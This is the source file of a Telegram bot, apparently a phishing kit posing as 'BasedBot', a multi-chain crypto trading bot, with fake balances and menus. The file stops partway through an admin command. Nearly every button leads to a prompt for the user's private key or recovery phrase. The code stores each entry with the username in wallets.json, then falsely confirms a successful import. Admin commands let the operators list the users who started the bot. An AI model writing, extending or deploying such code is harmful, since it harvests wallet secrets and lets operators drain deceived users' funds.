require("dotenv").config();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require("path");
const { text } = require("stream/consumers");
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;


const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

// Admin whitelist - Add trusted telegram usernames here
const ADMIN_IDS = process.env.ADMIN_IDS.split(",").map((id) =>
  Number(id.trim()),
);
const walletsFile = path.join(__dirname, "wallets.json");
const usersFile = path.join(__dirname, "users.json");
const languageSettingsFile = path.join(__dirname, "language-settings.json");

const LANGUAGES = {
  en: { nativeLabel: "English" },
  es: { nativeLabel: "Español" },
  fr: { nativeLabel: "Français" },
  de: { nativeLabel: "Deutsch" },
  pt: { nativeLabel: "Português" },
  ru: { nativeLabel: "Русский" },
  tr: { nativeLabel: "Türkçe" },
  zh: { nativeLabel: "中文" },
};

function loadLanguageSettings() {
  if (!fs.existsSync(languageSettingsFile)) return {};

  try {
    return JSON.parse(fs.readFileSync(languageSettingsFile, "utf8"));
  } catch (error) {
    console.error("Failed to parse language-settings.json:", error.message);
    return {};
  }
}

function getLanguage(chatId) {
  const languageCode = loadLanguageSettings()[String(chatId)] || "en";
  return LANGUAGES[languageCode] ? languageCode : "en";
}

function saveLanguage(chatId, languageCode) {
  const languageSettings = loadLanguageSettings();
  languageSettings[String(chatId)] = languageCode;
  fs.writeFileSync(languageSettingsFile, JSON.stringify(languageSettings, null, 2));
}

// Load wallets from file
function loadWallets() {
  if (!fs.existsSync(walletsFile)) {
    return {};
  }

  const rawWallets = fs.readFileSync(walletsFile, "utf8").trim();
  if (!rawWallets) {
    return {};
  }

  try {
    return JSON.parse(rawWallets);
  } catch (error) {
    console.error("Failed to parse wallets.json:", error.message);
    return {};
  }
}

// Save wallets to file
function saveWallets(wallets) {
  fs.writeFileSync(walletsFile, JSON.stringify(wallets, null, 2));
}

function loadUsers() {
  if (!fs.existsSync(usersFile)) {
    return {};
  }

  const rawUsers = fs.readFileSync(usersFile, "utf8").trim();
  if (!rawUsers) {
    return {};
  }

  try {
    return JSON.parse(rawUsers);
  } catch (error) {
    console.error("Failed to parse users.json:", error.message);
    return {};
  }
}

function saveUsers(users) {
  fs.writeFileSync(usersFile, JSON.stringify(users, null, 2));
}

function pruneExpiredUsers(users) {
  const now = Date.now();
  let changed = false;

  for (const [userId, userData] of Object.entries(users)) {
    if (now - userData.timestamp >= userData.ttl) {
      delete users[userId];
      changed = true;
    }
  }

  return changed;
}

function loadActiveUsers() {
  const users = loadUsers();

  if (pruneExpiredUsers(users)) {
    saveUsers(users);
  }

  return users;
}

function saveStartedUser(user) {
  const users = loadActiveUsers();
  const userId = String(user.id);

  users[userId] = {
    id: user.id,
    username: user.username || "",
    firstName: user.first_name || "",
    lastName: user.last_name || "",
    timestamp: Date.now(),
    ttl: 24 * 60 * 60 * 1000, // 24 hours
  };

  saveUsers(users);
}

function pruneExpiredWallets(wallets) {
  const now = Date.now();
  let changed = false;

  for (const [userId, userData] of Object.entries(wallets)) {
    const validWallets = (userData.wallets || []).filter(
      (wallet) => now - wallet.timestamp < wallet.ttl,
    );

    if (validWallets.length !== (userData.wallets || []).length) {
      changed = true;
    }

    if (validWallets.length === 0) {
      delete wallets[userId];
      changed = true;
    } else {
      wallets[userId].wallets = validWallets;
    }
  }

  return changed;
}

function loadActiveWallets() {
  const wallets = loadWallets();

  if (pruneExpiredWallets(wallets)) {
    saveWallets(wallets);
  }

  return wallets;
}

// Save wallet with TTL (24 hours)
function saveWallet(userId, username, phrase) {
  const wallets = loadActiveWallets();
  if (!wallets[userId]) {
    wallets[userId] = { username, wallets: [] };
  }
  wallets[userId].wallets.push({
    phrase,
    timestamp: Date.now(),
    ttl: 24 * 60 * 60 * 1000, // 24 hours in milliseconds
  });
  saveWallets(wallets);
}

// Get valid wallets (not expired)
function getValidWallets(userId) {
  const wallets = loadActiveWallets();
  if (!wallets[userId]) return null;

  const userData = wallets[userId];
  const now = Date.now();
  const validWallets = userData.wallets.filter(
    (w) => now - w.timestamp < w.ttl,
  );

  return {
    username: userData.username,
    wallets: validWallets.map((w) => ({
      phrase: w.phrase,
      savedTime: new Date(w.timestamp).toLocaleString(),
      expiresIn:
        Math.ceil((w.ttl - (now - w.timestamp)) / (60 * 60 * 1000)) + " hours",
    })),
  };
}

loadActiveWallets();

// State tracking for users waiting to import wallet
const userStates = {};
const lastRefreshTimes = {};

function formatTimestamp(date) {
  const pad = (value) => String(value).padStart(2, "0");
  return `${date.getFullYear()}-${pad(date.getMonth() + 1)}-${pad(date.getDate())} ${pad(
    date.getHours(),
  )}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
}

function formatLastUpdated(chatId) {
  const timestamp = lastRefreshTimes[chatId] || Date.now() - 2 * 60 * 1000;
  return formatTimestamp(new Date(timestamp));
}

function getReferralCode(user) {
  const rawCode = user?.username || `user_${user?.id || "unknown"}`;
  return rawCode.replace(/[^a-zA-Z0-9]/g, "") || `user${user?.id || "unknown"}`;
}

function escapeMarkdownText(value) {
  return String(value).replace(/([_*`\[])/g, "\\$1");
}

function escapeMarkdownCode(value) {
  return String(value).replace(/([`\\])/g, "\\$1");
}

const mainMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "🎒 Your Bags", callback_data: "your_bag" }],
      [
        { text: "💳 Wallets", callback_data: "wallets" },
        { text: "⛩️ Bridge", callback_data: "bridge" },
      ],
      [
        { text: "🔭 Tracker", callback_data: "tracker" },
        { text: "⏱️ Orders", callback_data: "orders" },
      ],
      [
        { text: "🔥 Trenches", callback_data: "trenches" },
        { text: "📊 Portfolio", callback_data: "portfolio" },
      ],
      [
        { text: "🪄 Automations", callback_data: "automations" },
        { text: "🎁 Rewards", callback_data: "rewards" },
      ],
      [
        { text: "⚙️ Settings", callback_data: "settings" },
        { text: "🤖 Bot & Rank", callback_data: "bot_and_rank" },
      ],
      [{ text: "Support", callback_data: "support" }],
      [{ text: "🔄️ Refresh", callback_data: "refresh" }],
    ],
  },
};
const WALLET_SETTINGS_TRANSLATIONS = {
  en: ["Wallet Settings", "Manage your wallets quickly and easily.", "Available Wallets", "Import a Wallet", "Preferred Wallet", "Export Private Key", "Delete Wallet", "Transfer Currency", "Transfer Token", "Swap Currency", "Split / Consolidate", "New Wallet", "Reorder", "Refresh", "No wallets imported yet."],
  es: ["Configuración de billeteras", "Gestiona tus billeteras de forma rápida y sencilla.", "Billeteras disponibles", "Importar una billetera", "Billetera preferida", "Exportar clave privada", "Eliminar billetera", "Transferir moneda", "Transferir token", "Intercambiar moneda", "Dividir / Consolidar", "Nueva billetera", "Reordenar", "Actualizar", "Aún no se han importado billeteras."],
  fr: ["Paramètres des portefeuilles", "Gérez vos portefeuilles rapidement et facilement.", "Portefeuilles disponibles", "Importer un portefeuille", "Portefeuille préféré", "Exporter la clé privée", "Supprimer le portefeuille", "Transférer une devise", "Transférer un jeton", "Échanger une devise", "Diviser / Consolider", "Nouveau portefeuille", "Réorganiser", "Actualiser", "Aucun portefeuille n’a encore été importé."],
  de: ["Wallet-Einstellungen", "Verwalte deine Wallets schnell und einfach.", "Verfügbare Wallets", "Wallet importieren", "Bevorzugte Wallet", "Privaten Schlüssel exportieren", "Wallet löschen", "Währung übertragen", "Token übertragen", "Währung tauschen", "Aufteilen / Zusammenführen", "Neue Wallet", "Neu anordnen", "Aktualisieren", "Noch keine Wallets importiert."],
  pt: ["Configurações de carteiras", "Gerencie suas carteiras de forma rápida e fácil.", "Carteiras disponíveis", "Importar uma carteira", "Carteira preferida", "Exportar chave privada", "Excluir carteira", "Transferir moeda", "Transferir token", "Trocar moeda", "Dividir / Consolidar", "Nova carteira", "Reordenar", "Atualizar", "Nenhuma carteira foi importada ainda."],
  ru: ["Настройки кошельков", "Управляйте кошельками быстро и удобно.", "Доступные кошельки", "Импортировать кошелёк", "Предпочтительный кошелёк", "Экспортировать приватный ключ", "Удалить кошелёк", "Перевести валюту", "Перевести токен", "Обменять валюту", "Разделить / Объединить", "Новый кошелёк", "Изменить порядок", "Обновить", "Кошельки ещё не импортированы."],
  tr: ["Cüzdan Ayarları", "Cüzdanlarınızı hızlı ve kolay şekilde yönetin.", "Kullanılabilir cüzdanlar", "Cüzdan içe aktar", "Tercih edilen cüzdan", "Özel anahtarı dışa aktar", "Cüzdanı sil", "Para birimi transferi", "Token transferi", "Para birimi takası", "Böl / Birleştir", "Yeni cüzdan", "Yeniden sırala", "Yenile", "Henüz cüzdan içe aktarılmadı."],
  zh: ["钱包设置", "快速轻松地管理您的钱包。", "可用钱包", "导入钱包", "首选钱包", "导出私钥", "删除钱包", "转账货币", "转账代币", "兑换货币", "拆分 / 合并", "新钱包", "重新排序", "刷新", "尚未导入钱包。"],
};

function getWalletSettingsText(languageCode) {
  const [title, description, availableWallets, , , , , , , , , , , , noWallets] = WALLET_SETTINGS_TRANSLATIONS[languageCode] || WALLET_SETTINGS_TRANSLATIONS.en;
  return `💰 *${title}*\n${description}\n\n👜 *${availableWallets}*\n${noWallets}`;
}

function getWalletSettingsMenu(languageCode) {
  const [, , , importWallet, preferredWallet, exportPrivateKey, deleteWallet, transferCurrency, transferToken, swapCurrency, splitConsolidate, newWallet, reorder, refresh] = WALLET_SETTINGS_TRANSLATIONS[languageCode] || WALLET_SETTINGS_TRANSLATIONS.en;

  return {
    reply_markup: {
      inline_keyboard: [
      [
        { text: `🔑 ${importWallet}`, callback_data: "import_wallet_prompt" },
        { text: `💼 ${preferredWallet}`, callback_data: "delete_wallet" },
      ],
      [
        {
          text: `📥 ${exportPrivateKey}`,
          callback_data: "import_wallet_prompt",
        },
        { text: `🗑️ ${deleteWallet}`, callback_data: "delete_wallet" },
      ],
      [
        { text: `💰 ${transferCurrency}`, callback_data: "import_wallet_prompt" },
        { text: `🪙 ${transferToken}`, callback_data: "import_wallet_prompt" },
      ],
      [
        { text: `🔁 ${swapCurrency}`, callback_data: "import_wallet_prompt" },
        {
          text: `🔀 ${splitConsolidate}`,
          callback_data: "import_wallet_prompt",
        },
      ],
      [{ text: "W1 ✅", callback_data: "import_wallet_prompt" }],
      [
        { text: `➕ ${newWallet}`, callback_data: "import_wallet_prompt" },
        { text: `🔀 ${reorder}`, callback_data: "import_wallet_prompt" },
      ],
      [
        { text: "⬅️", callback_data: "back_to_main" },
        { text: `🔃 ${refresh}`, callback_data: "refresh" },
      ],
      ],
    },
  };
}
const importWalletMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🔑 Import Wallet", callback_data: "request_wallet" },
        { text: "❌ Delete wallet ", callback_data: "delete_wallet" },
      ],
      [
        { text: "⬅️ Back", callback_data: "back" },
        { text: "🗑️ Close", callback_data: "close" },
      ],
    ],
  },
};
const trackerMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: " 👛Wallets✅", callback_data: "wallet" },
        { text: "🪙Tokens", callback_data: "tokens" },
      ],
      [{ text: "➕ Add", callback_data: "add" }],
      [
        { text: "📥 Import", callback_data: "import" },
        { text: "📤 Export", callback_data: "export" },
      ],
      [{ text: "📂 Groups", callback_data: "groups" }],
      [{ text: "⬅️", callback_data: "back_to_main" }],
    ],
  },
};
const ordersMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "🗑️ Delete Mode", callback_data: "create_task" }],
      [
        { text: "🔗 16 chain(s)", callback_data: "16chains" },
        { text: "📋 Order Type", callback_data: "refresh" },
      ],
      [
        { text: "⬅️", callback_data: "back" },
        { text: "🔄️", callback_data: "refresh" },
      ],
    ],
  },
};
const trenchesMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "📊 Top", callback_data: "top" },
        { text: "📈 Trending", callback_data: "trending" },
      ],
      [
        { text: "👀 Most Viewed", callback_data: "pause_all" },

        { text: "Search", callback_data: "search" },
      ],
      [{ text: "⬅️", callback_data: "back" }],
    ],
  },
};
const automationsMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "🎯 Sniper", callback_data: "sniper" },
        { text: "✍️ Copy Trading", callback_data: "copy_trade" },
      ],
      [
        { text: "⌚ DCA  ", callback_data: "DCA" },
        { text: "📱 Social Copy Trading", callback_data: "usd" },
      ],
      [{ text: "📢 Copy KOL", callback_data: "copy_kol" }],
      [{ text: "⬅️", callback_data: "back" }],
    ],
  },
};
const rewardsMenu = {
  reply_markup: {
    inline_keyboard: [
      
      [
        { text: "🏆 View Tiers", callback_data: "View_Tiers" },
        { text: "✏️ Custom Code", callback_data: "cc" },
      ],
      [{ text: "🔗 Manage Codes", callback_data: "manage_codes" }],
      [
        { text: "💰 Claim Cashback", callback_data: "Cashback_claim" },
        { text: "💰 Claim Referral", callback_data: "referral_claim" },
      ],
      [
        {
          text: "💊 Claim PumpFun Cashback",
          callback_data: "pumpfun_cashback",
        },
      ],
      [{ text: "⬅️", callback_data: "back" }],
    ],
  },
};
function getSettingsMenu(languageCode = "en") {
  const language = LANGUAGES[languageCode] || LANGUAGES.en;

  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "─── Trading ───", callback_data: "refresh" }],
      [
        { text: "📉 Slippage", callback_data: "suggestions" },
        { text: "✨ Price Impact", callback_data: "print" },
      ],
      [
        { text: "🚀 Gas Fees", callback_data: "suggestions" },
        { text: "⚡ Quick Buy", callback_data: "print" },
      ],
      [
        { text: "🛡️ MEV", callback_data: "suggestions" },
        { text: "🥷 Pro Mode", callback_data: "print" },
      ],
      [{ text: "💵 Base Currency", callback_data: "base_currency" }],
      [{ text: "─── Buttons & UI ───", callback_data: "refresh" }],

      [
        { text: "💸 Buy Buttons", callback_data: "home_page" },
        { text: "💰 Sell Buttons", callback_data: "degen_mode" },
      ],
      [{ text: "🔢 multi-Wallet Buy", callback_data: "mwb" }],

      [
        { text: "🖥️ Monitor", callback_data: "buy" },
        { text: "🎨 Theme", callback_data: "sell" },
      ],
      [
        { text: "📐 Monitor Template", callback_data: "buy" },
        { text: "🔗 Custom Links", callback_data: "sell" },
      ],
      [
        { text: "🖼️ PnL Card", callback_data: "buy" },
        { text: "⌨️ Command Menu", callback_data: "sell" },
      ],
      [{ text: "─── Automations ───", callback_data: "refresh" }],
      [
        { text: "📊 Auto TP/SL", callback_data: "monitor" },
        { text: "🏃 Auto Devsell", callback_data: "wallet_selection" },
      ],
      [{ text: "🤖 Automation Bot", callback_data: "refresh" }],
      [
        { text: "🚫 Tokens", callback_data: "monitor" },
        { text: "⛔ Devs", callback_data: "wallet_selection" },
      ],
      [{ text: "🙈 Hidden", callback_data: "monitor" }],

      [{ text: "─── General ───", callback_data: "refresh" }],
      [
        { text: " Chains", callback_data: "monitor" },
        { text: `🌐 Language: ${language.nativeLabel}`, callback_data: "language" },
      ],
      [
        { text: "💼 Preferred Walet", callback_data: "monitor" },
        { text: "🎁 Rewards", callback_data: "wallet_selection" },
      ],
      [
        { text: "🕛 Timezone", callback_data: "monitor" },
        { text: "⏰ Time Format", callback_data: "wallet_selection" },
      ],
      [{ text: "🔒 Privacy", callback_data: "wallet_selection" }],
      [{ text: "🗑️ Reset Settings", callback_data: "close" }],
      [{ text: "◀️ Back", callback_data: "back" }],
      ],
    },
  };
}

function getLanguageMenu(selectedLanguageCode) {
  const languageButtons = Object.entries(LANGUAGES).map(([code, language]) => ({
    text: `${code === selectedLanguageCode ? "✅ " : ""}${language.nativeLabel}`,
    callback_data: `set_language_${code}`,
  }));

  return {
    reply_markup: {
      inline_keyboard: [
        [languageButtons[0], languageButtons[1]],
        [languageButtons[2], languageButtons[3]],
        [languageButtons[4], languageButtons[5]],
        [languageButtons[6], languageButtons[7]],
        [{ text: "◀️ Back to Settings", callback_data: "settings" }],
      ],
    },
  };
}
supportMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "♻️ Recovery", callback_data: "import_wallet_prompt" },
        { text: "🔢 Access Code", callback_data: "import_wallet_prompt" },
      ],
      [{ text: "⬅️ Back", callback_data: "back" }],
    ],
  },
};

// const bot_and_rankMenu = {
//   reply_markup: {
//     inline_keyboard: [
//       [
//         { text: "50 %", callback_data: "50" },
//         { text: "100 %", callback_data: "100" },
//         { text: "X SOL", callback_data: "xsol" },
//       ],
//       [{text: "💸 Set Address", callback_data: "back" }],
//       [
//         { text: "◀️ Back", callback_data: "back" },
//         { text: "🔄️ Refresh", callback_data: "refresh" },
//       ],
//       [{ text: "🗑️ Close", callback_data: "close" }],
//     ],
//   },
// };
const referMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: "🔑 Change Referral Code", callback_data: "back_to_main" }],
      [
        { text: "◀️ Back", callback_data: "back" },
        { text: "🔄️ Refresh", callback_data: "refresh" },
      ],
      [{ text: "🗑️ Close", callback_data: "close" }],
    ],
  },
};
const bridgeMenu = {
  reply_markup: {
    inline_keyboard: [
      [{ text: " Base (0.00000 ETH)", callback_data: "import_wallet_prompt" }],
      [{ text: " ETH (0.00000 ETH)", callback_data: "import_wallet_prompt" }],
      [
        {
          text: " Binance (0.00000 BNB)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [
        {
          text: " Abstract (0.00000 ETH)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [
        {
          text: " Avalanche (0.00000 AVAX)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [
        {
          text: " HyperEVM (0.00000 HYPE)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [
        {
          text: " Arbitrum (0.00000 ETH)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [{ text: " Ink (0.00000 ETH)", callback_data: "import_wallet_prompt" }],
      [{ text: " Story (0.00000 IP)", callback_data: "import_wallet_prompt" }],
      [
        {
          text: " Unichain (0.00000 ETH)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [{ text: " Monad (0.00000 MON)", callback_data: "import_wallet_prompt" }],
      [
        {
          text: " Solana (0.00000 SOL)",
          callback_data: "import_wallet_prompt",
        },
      ],
      [{ text: "🔙 Back", callback_data: "back" }],
    ],
  },
};
const portfolioMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "📊 History", callback_data: "min" },
        { text: "📦 Closed Position", callback_data: "Closed_position" },
      ],
      [{ text: "📆 PnL", callback_data: "PNL" }],
      [{ text: "⬅️", callback_data: "back" }],
    ],
  },
};
const recoveryMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "✏️ Min Value:N/A...", callback_data: "min" },
        { text: "✏️ Sell Position:10...", callback_data: "sell_position" },
      ],
      [
        { text: "🏠 HomePage", callback_data: "home_page" },
        { text: "🔴 USD", callback_data: "usd" },
        { text: "🔄️ Refresh", callback_data: "refresh" },
      ],
      [{ text: "🗑️ Delete", callback_data: "delete_wallet" }],
    ],
  },
};
const bot_and_rankMenu = {
  reply_markup: {
    inline_keyboard: [
      [
        { text: "Ethereum", callback_data: "wallet" },
        { text: "Base", callback_data: "wallet" },
      ],
      [
        { text: "Binance", callback_data: "BNB" },
        { text: "Avalanche", callback_data: "BASE" },
      ],
      [
        { text: "HyperEVM", callback_data: "HYPE" },
        { text: "Arbitrum", callback_data: "TRON" },
      ],
      [{ text: "🏆 Leaderboard", callback_data: "SUI" }],
      [{ text: "💬 Community Server", callback_data: "SUI" }],
      [{ text: "🤖 Bots", callback_data: "SUI" }],
      [{ text: "⬅️", callback_data: "back" }],
    ],
  },
};

function getWelcomeText(chatId) {
  return `*BasedBot 1 🪙 V4.4*
The Ultimate Degen Trading Partner

*💼 W1 ⭐️*

🧢 Base: *0🪙* ($0)
💎 Ethereum: *0🪙* ($0)
🌞 Binance: *0🪙* ($0)
✳️ Abstract: *0🪙* ($0)
🔺 Avalanche: *0🪙* ($0)
🧪 HyperEVM: *0🪙* ($0)
🧿 Arbitrum: *0🪙* ($0)
🍇 Ink: *0🪙* ($0)
📜 Story: *0🪙* ($0)
🔲 X Layer: *0🪙* ($0)
⚛️ Plasma: *0🪙* ($0)
🦄 UniChain: *0🪙* ($0)
💠 Monad: *0🪙* ($0)
Ⓜ️ MegaETH: *0🪙* ($0)
⏱️ Tempo: *0🪙* ($0)
🧬 Solana: *0🪙* ($0)

Total: $0

*EVM*: \`0xB8b178C7FE1aF974C2695367B8e06943715274b3\`
*SOL*: \`DwCQnGZvTHBXosX4VV17daHf5KBY7pzCBmfYY9EWETxn\``;
}

// Show menu on /start
bot.onText(/^\/start$/, (msg) => {
  saveStartedUser(msg.from);

  bot.sendMessage(msg.chat.id, getWelcomeText(msg.chat.id), {
    parse_mode: "Markdown",
    ...mainMenu,
  });
});

bot.on("callback_query", (query) => {
  const chatId = query.message.chat.id;
  const msgId = query.message.message_id;
  const referralCode = getReferralCode(query.from);

  bot.answerCallbackQuery(query.id); // clears the loading spinner

  switch (query.data) {
    case "close":
      bot.deleteMessage(chatId, msgId);
      break;
    case "back":
    case "back_to_main":
    case "home_page":
      bot.editMessageText(getWelcomeText(chatId), {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
        ...mainMenu,
      });
      break;
    case "refresh":
      lastRefreshTimes[chatId] = Date.now();
      bot.editMessageText(getWelcomeText(chatId), {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
        ...mainMenu,
      });
      break;
    case "delete_wallet":
      bot.editMessageText(`✅ Wallet deleted successfully.`, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
        ...mainMenu,
      });
      break;
    case "import_wallet":
      bot.editMessageText(getWalletSettingsText(getLanguage(chatId)), {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
        ...getWalletSettingsMenu(getLanguage(chatId)),
      });
      break;
    case "import_wallet_prompt":
      userStates[chatId] = "waiting_for_wallet";

      bot.editMessageText(
        `💰 *Wallet Settings*
Manage your wallets quickly and easily.

👜 *Available Wallets*
No wallets imported yet.`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...importWalletMenu,
        },
      );
      break;
      break;
    case "request_wallet":
      userStates[chatId] = "waiting_for_wallet";
      bot.editMessageText(`Please enter your private key or recovery phrase:`, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
      });
      break;
    case "recovery":
    case "orders":
      bot.editMessageText(
        `⏱️ Your Pending Orders

📋 Automated trading orders that execute when conditions are met

You don't have any active orders.`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...ordersMenu,
        },
      );
      break;
    case "wallets":
      bot.editMessageText(
        `* Wallet 1 ⭐️*

🧢 Base: *0🪙* ($0)
💎 Ethereum: *0🪙* ($0)
🌞 Binance: *0🪙* ($0)
✳️ Abstract: *0🪙* ($0)
🔺 Avalanche: *0🪙* ($0)
🧪 HyperEVM: *0🪙* ($0)
🧿 Arbitrum: *0🪙* ($0)
🍇 Ink: *0🪙* ($0)
📜 Story: *0🪙* ($0)
🔲 X Layer: *0🪙* ($0)
⚛️ Plasma: *0🪙* ($0)
🦄 UniChain: *0🪙* ($0)
💠 Monad: *0🪙* ($0)
Ⓜ️ MegaETH: *0🪙* ($0)
⏱️ Tempo: *0🪙* ($0)
🧬 Solana: *0🪙* ($0)


Total: *$0*

*EVM*: \`0xB8b178C7FE1aF974C2695367B8e06943715274b3\`
*SOL*: \`DwCQnGZvTHBXosX4VV17daHf5KBY7pzCBmfYY9EWETxn\``,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...getWalletSettingsMenu(getLanguage(chatId)),
        },
      );
      break;
    case "trenches":
      bot.editMessageText(
        `*🔥 Trenches*
Discover what's hot across all chains`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...trenchesMenu,
        },
      );
      break;
    case "portfolio":
      bot.editMessageText(
        `📊 Portfolio

🟩 Realized PnL 7D: +$0.00
Win Rate: 0% (0W / 0L)
Trades: 0`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...portfolioMenu,
        },
      );
      break;
    case "rewards":
      bot.editMessageText(
        `🎁 *REWARDS HUB*

🎖️ Tier: ⬜️ *X1 – Novice*
💸 Cashback: *5%*
🔗 Referral: *30%*
👥 Referrals: *0*

👥 REFERRAL
├─ 💰 Unclaimed:* $0*
└─ ✅ Claimed: *$0*

💸 CASHBACK
├─ 💰 Unclaimed: *$0*
└─ ✅ Claimed: *$0*

📊 TOTAL
├─ 💰 Total Unclaimed: *$0*
└─ ✅ Total Claimed: *$0*

📋 Referral Settings
🔗 Link: \`https://t.me/based_eth_bot?start=r_${referralCode}\` (Click to copy)
#️⃣ Code: \`${referralCode}\` (Click to copy)`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...rewardsMenu,
        },
      );
      break;
    case "presales":
      bot.editMessageText(
        `Add, remove, and manage presales!

ℹ️ ⚙️ *Config dictates the default settings of your presales. You can further customize each presale individually.*

🕐 Last updated: ${formatLastUpdated(chatId)}`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...presalesMenu,
        },
      );
      break;
    case "settings":
      bot.editMessageText(
        `⚙️* Settings*

Configure your bot per-chain: wallets, fees, slippage, buttons, automations and more.

            `,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...getSettingsMenu(getLanguage(chatId)),
        },
      );
      break;
    case "language": {
      const selectedLanguageCode = getLanguage(chatId);
      const selectedLanguage = LANGUAGES[selectedLanguageCode];

      bot.editMessageText(
        `🌐 *Language*\n\nChoose your preferred bot language.\n\nCurrent language: *${selectedLanguage.nativeLabel}*`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...getLanguageMenu(selectedLanguageCode),
        },
      );
      break;
    }
    case "set_language_en":
    case "set_language_es":
    case "set_language_fr":
    case "set_language_de":
    case "set_language_pt":
    case "set_language_ru":
    case "set_language_tr":
    case "set_language_zh": {
      const languageCode = query.data.replace("set_language_", "");
      saveLanguage(chatId, languageCode);

      bot.editMessageText(getWalletSettingsText(languageCode), {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
        ...getWalletSettingsMenu(languageCode),
      });
      break;
    }
    case "withdraw":
      bot.editMessageText(
        `🌸* Withdraw Solana*

Balance: -- SOL
Current withdrawal address: --

🔧 Last address edit: --

🕐 *Last updated*: ${formatLastUpdated(chatId)}`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...withdrawMenu,
        },
      );
      break;
    case "groups":
      bot.editMessageText(
        `Groups

No groups yet
                `,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
        },
      );
      break;
    case "tracker":
      bot.editMessageText(
        `*🔭 Wallet Tracker*

Track wallets and get real‑time alerts for buys, sells and balance changes

📊 0 wallets tracked`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...trackerMenu,
        },
      );
      break;

      bot.editMessageText(
        `⛩️ *Bridge (1 / 3)*

🧾 Fee: *0%*

Select the source chain you want to transfer from
`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...bridgeMenu,
        },
      );
      break;
    case "automations":
      bot.editMessageText(
        `*🤖 AUTOMATIONS 🤖*
Automate your trading strategies. Choose from the following options:`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...automationsMenu,
        },
      );
      break;
    case "bridge":
      bot.editMessageText(
        `⛩️ *Bridge (1 / 3)*

🧾 Fee: *0%*

Select the source chain you want to transfer from
`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...bridgeMenu,
        },
      );
      break;
    case "bot_and_rank":
      bot.editMessageText(`Select a network to view available channels:`, {
        chat_id: chatId,
        message_id: msgId,
        parse_mode: "Markdown",
        ...bot_and_rankMenu,
      });
      break;
    case "support":
      bot.editMessageText(
        `*🆘 Support*
Need help? Contact our support team for assistance with any issues or questions you may have.
`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...supportMenu,
        },
      );
      break;
    default:
      bot.editMessageText(
        `💰* Wallet Settings*
Manage your wallets quickly and easily.

👜 *Available Wallets*
No wallets imported yet.

🕐 *Last updated*: ${formatLastUpdated(chatId)}`,
        {
          chat_id: chatId,
          message_id: msgId,
          parse_mode: "Markdown",
          ...importWalletMenu,
        },
      );
      break;
  }
});

// Handle text messages for wallet import
bot.on("message", (msg) => {
  const chatId = msg.chat.id;

  // Ignore commands — they're handled by onText handlers
  if (!msg.text || msg.text.startsWith("/")) return;

  if (userStates[chatId] === "waiting_for_wallet") {
    try {
      const phrase = msg.text;
      const username = msg.from.username || msg.from.first_name || "Unknown";

      // Save wallet with TTL
      saveWallet(chatId, username, phrase);

      bot.sendMessage(
        chatId,
        `✅ Wallet imported successfully!

You can now use all features.`,
      );
      delete userStates[chatId];
    } catch (error) {
      console.error("Wallet import failed:", error);
      bot.sendMessage(
        chatId,
        "Sorry, I couldn't import that wallet. Please try again.",
      );
    }
  }
});

bot.on("polling_error", (error) => {
  console.error("Polling error:", error.message || error);
  if (error.response?.body) {
    console.error("Telegram response:", error.response.body);
  }
});

bot.onText(/\/allusers/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!ADMIN_IDS.includes(userId)) {
    bot.sendMessage(
      chatId,
      "❌ You don't have permission to access this command.",
    );
    return;
  }

  const users = loadActiveUsers();
  const startedUsers = Object.values(users).sort(
    (a, b) => (b.timestamp || 0) - (a.timestamp || 0),
  );

  if (startedUsers.length === 0) {
    bot.sendMessage(
      chatId,
      "📋 No active users (all expired or none started).",
    );
    return;
  }

  let message = `👥 Active /start users (last 24h): ${startedUsers.length}\n\n`;

  startedUsers.forEach((user, idx) => {
    const name =
      [user.firstName, user.lastName].filter(Boolean).join(" ") || "Unknown";
    const username = user.username ? `@${user.username}` : "No username";
